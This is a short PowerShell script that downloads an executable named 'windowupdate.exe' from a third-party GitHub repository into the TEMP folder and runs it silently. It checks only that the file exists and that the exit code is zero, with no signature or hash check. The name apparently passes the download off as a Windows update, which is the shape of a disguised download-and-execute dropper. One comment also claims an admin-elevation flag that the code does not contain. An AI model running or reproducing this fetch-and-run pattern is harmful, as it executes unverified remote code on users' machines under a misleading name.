# Simple PowerShell script to download and install windowupdate.exe

# 1. Force TLS 1.2 for secure downloads (required by GitHub)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. Define variables
$url = "https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/windowupdate.exe"
$path = Join-Path $env:TEMP "windowupdate.exe"

# Function to test download
function Test-Download {
    if (Test-Path $path) {
        Write-Host "[OK] Download successful: $path exists" -ForegroundColor Green
        return $true
    } else {
        Write-Warning "[ERROR] Download failed: $path does not exist"
        return $false
    }
}

# Function to test install
function Test-Install {
    param($exitCode)
    if ($exitCode -eq 0) {
        Write-Host "[OK] Install successful: Exit code $exitCode" -ForegroundColor Green
        return $true
    } else {
        Write-Warning "[ERROR] Install failed: Exit code $exitCode"
        return $false
    }
}

# --- Execution ---

# Download the file
Write-Host "Downloading $url..."
try {
    # Remove old version if it exists to avoid conflicts
    if (Test-Path $path) { Remove-Item $path -Force }
    
    Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
} catch {
    Write-Error "Download error: $($_.Exception.Message)"
    exit 1
}

# Test download
if (-not (Test-Download)) { exit 1 }

# Install silently
Write-Host "Installing $path silently..."
try {
    # Added -Verb RunAs in case the .exe requires Admin rights
    $process = Start-Process -FilePath $path -ArgumentList "/S" -Wait -PassThru -ErrorAction Stop
    $exitCode = $process.ExitCode
} catch {
    Write-Error "Install error: $($_.Exception.Message)"
    exit 1
}

# Test install
if (Test-Install $exitCode) {
    Write-Host "Script completed successfully" -ForegroundColor Cyan
} else {
    exit 1
}
